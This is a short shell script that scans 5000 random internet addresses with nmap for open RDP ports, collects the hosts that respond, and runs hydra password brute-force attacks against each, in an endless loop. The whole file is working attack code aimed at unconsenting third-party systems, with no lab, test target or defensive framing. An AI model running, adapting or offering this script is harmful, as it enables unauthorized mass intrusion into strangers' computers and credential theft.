#!/bin/sh

while true
do
echo "Press [CTRL+C] to exit this loop..."
echo "NMAP"
sudo nmap -iR 5000 -v  -Pn -sS -p 3389  --open -n --script rdp-enum-encryption>nmaprdp.txt
grep SUCCESS -B 7 nmaprdp.txt|grep report|cut -d ' ' -f 5 > rdphosts.txt
cat rdphosts.txt >>  allrdphosts.txt
for entry in `cat rdphosts.txt`
do
echo $entry
hydra -t 1 -V -f -L user -P pass rdp://$entry  >> $entry.txt &
sleep 30
done
sleep 2
done

